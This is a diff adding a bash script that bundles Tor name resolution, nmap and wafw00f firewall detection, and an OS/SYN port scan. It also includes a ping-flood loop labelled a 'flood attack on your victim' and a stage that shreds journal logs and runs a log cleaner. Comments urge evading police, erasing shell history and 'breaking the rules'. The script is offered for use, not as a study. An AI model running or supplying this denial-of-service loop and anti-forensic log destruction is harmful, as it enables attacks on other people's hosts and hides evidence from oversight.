@@ -1,0 +1,101 @@
+#! /bin/bash
+# scannerscript Author: barbarelasalerosa
+# contact: jerusalemabandida@proton.me
+#
+# This is a basic tool that can help you to 
+# easily use of all Kali Linux Tools for Info-
+# Gathering and Scanning your host. Better said, 
+# it is 4 in 1, so you have it "on 1 place". 
+# I know it is not some eureka-project,
+# or something genius, but I hope it can help
+# you for further examinations and for
+# coming up with similar ideas that can ease
+# your pent-tests.
+
+# !!! When you finish "the job", in case you either do not know or you are a Script Kiddie, disconnect and restart the router. In case you use proxies, well...you know. In case you wanna act like A BIG BOY, then DO NOT USE your 
+# Internet and think twice before you decide to show off and get busted by people who are pretenders and not your hacker-or-non-hacker friends. Keep your mouth shut and GO ALL THE WAY. If you won't, then don't even start it !!!
+
+#"*******************************************************"
+#"*******************************************************"
+#
+# One more thing, I don't want to bother you with mile-long documentation and (for this tool) more than sufficient repositories:) I want to keep it simple, so you don't have to bother.
+# Usage is very simple: 
+
+   # 1.First, check (stupid, I know) if you have installed tools for Info-Gathering and Scanning Tools, such as: tor, nmap, wafw00f, ping. In case you don't have them installed, or updated...
+   # 2.Then, install them and/or update your machine;
+   # 3.Open your terminal and start this program by typing: ./scannerscript
+   # 4.Enjoy breaking the rules....
+   # 5.If cops knock on your door, save yourself and sacrifice me! Thank you and may all wizards bless your sinful soul..... :) :) :) 
+
+echo "For exiting program, click Ctrl+C"
+echo "Please enter host you want to check for its IP address (e.g. example.com): "
+read host
+
+service tor start
+
+tor-resolve $host
+
+echo "Please enter IP address or host you want to check for both wafs: "
+read IPSite
+
+nmap -p 80 --script http-waf-detect $IPSite
+
+wafw00f -v -a $IPSite
+
+echo "Do you want to scan it like an angry moth*****ker...? (for 'yes' click 1 and for 'no' click 0): "
+read answer
+if [ $answer -eq 1 ];then
+
+    nmap -v -sS -O $IPSite -oG file1
+    cat file1 | grep open > file2
+    cat file2 | cut -f2 -d ":"| cut -f1 -d "(" > file3
+    cat file3
+else
+    echo "We are turning off!"
+fi
+
+echo "Are you ready for flood attack on your victim? (for 'yes' click 1 and for 'no' click 0): "
+read answer
+if [ $answer -eq 1 ];then
+
+    echo "Enter IP address of victim: "
+    read IPaddress
+    while true; do
+    ping -4 -r -s 42069 $IPaddress -v
+    done
+else
+    echo "We are turning off!"
+fi
+
+# There is a BONUS, and you MUST know this and USE it no matter what: "shred" and "TuxLogCleaner" - Clear logs and, before that, destroy them by shredding 
+# files and journal files. If you haven't installed them, please do the same. Also, visit https://github.com/shipcod3/TuxLogCleaner and install the same. 
+
+echo "Do you want to shred journal files (for 'yes' click 1 and for 'no' click 0): "
+read answer
+if [ $answer -eq 1 ];then
+
+    echo "Now, follow these simple steps. First, open your terminal and type: open /var/log/journal"
+    echo "Then, rename folder or folders however you want, and open each of them and rename those yournal files by giving simple name to them, e.g. a.journal"
+    echo "Close /var/log/journal, and..."
+
+    echo "Enter the full path of your journal/log files (e.g. /var/log/journal/a/a.journal): "
+    read path
+
+    shred -n 10 $path
+    shred -z $path
+    shred -u $path
+
+    echo "In case you have more files to shred, you may repeat this action on second terminal by yourself."
+    echo "Now, we are about to start TuxLogCleaner, and be sure to have it installed in the same repository where you have all others, including this tool, installed. For tux_logcleaner.py, you must have root access for the same."
+    echo "Oh, yeah. Don't forget to open tux_logcleaner.py, and add: /root/.zsh_history to the list."
+else
+    echo "We are turning off!"
+fi
+echo "Do you want to start tux_logcleaner.py (for 'yes' click 1 and for 'no' click 0): "
+read answer
+if [ $answer -eq 1 ];then
+    
+    python3 tux_logcleaner.py
+else
+    echo "That's all folks! Bye Bye!"
+fi
